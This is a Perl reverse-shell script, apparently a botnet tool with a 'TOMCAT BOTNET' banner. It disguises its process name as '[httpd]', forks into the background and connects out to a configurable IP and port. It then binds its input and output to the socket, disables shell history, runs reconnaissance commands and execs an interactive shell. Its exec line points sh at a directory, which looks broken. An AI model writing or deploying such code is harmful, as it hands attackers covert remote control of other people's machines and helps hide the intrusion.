#!/usr/bin/perl
use strict;
use Socket;
use FileHandle;
use POSIX;

my $IP = '0.0.0.0';
my $Port = 4444;
my $Daemon = 1;
my $Auth   = 0; 
my $AuthorisePattern = qr(^127\.0\.0\.1$);
my $StrOut = "";
my $ProcessName = "/usr/lib/systemd/";

my $XBanner = "
     _____ ___  __  __  ___   _ _____   ___  ___ _____ _  _ ___ _____ 
    |_   _/ _ \\|  \\/  |/ __| /_\\_   _| | _ )/ _ \\_   _| \\| | __|_   _|
      | || (_) | |\\/| | (__ / _ \\| |   | _ \\ (_) || | | .` | _|  | |  
      |_| \\___/|_|  |_|\\___/_/ \\_\\_|   |___/\\___/ |_| |_|\\_|___| |_|  
                                                                      
                < Im in your system, no way to escapes. />

";
print($XBanner);

$0 = "[httpd]";

if (defined($ENV{'REMOTE_ADDR'})) {
	StrObject("Browser IP Address Appears To Be: $ENV{'REMOTE_ADDR'}");
	if ($Auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $AuthorisePattern) {
			StrObject("ERROR: Your Agent Isn't Authorised To View This Page");
			SysExit();
		}
	}
} elsif ($Auth) {
	StrObject("ERROR: Authentication Is Enabled, But I Couldn't Determine Your IP Address. Access Denied!");
	SysExit(0);
}

if ($Daemon) {
	my $pid = fork();
	if ($pid) {
		SysExit(0);
	}
	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));

if (connect(SOCK, sockaddr_in($Port,inet_aton($IP)))) {
	StrObject("Shell Session Started. $IP:$Port");
	StrObjectOut();
} else {
	StrObject("Couldn't Start Shell Session!. $IP:$Port: $!");
	SysExit();	
}

open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");

$ENV{'HISTFILE'} = '/dev/null';

system("w;uname -a;id;pwd");
exec("sh $ProcessName -i");

sub StrObject {
	my $Line = shift;
	$Line .= "\n";
	$StrOut .= $Line;
}

sub SysExit {
	StrObjectOut();
	exit 0;
}

sub StrObjectOut {
	print("\nContent-Length:" . length($StrOut));
	print("\nConnection: close");
	print("\nContent-Type: text/html\r\n\r\n");
	print($StrOut);
}
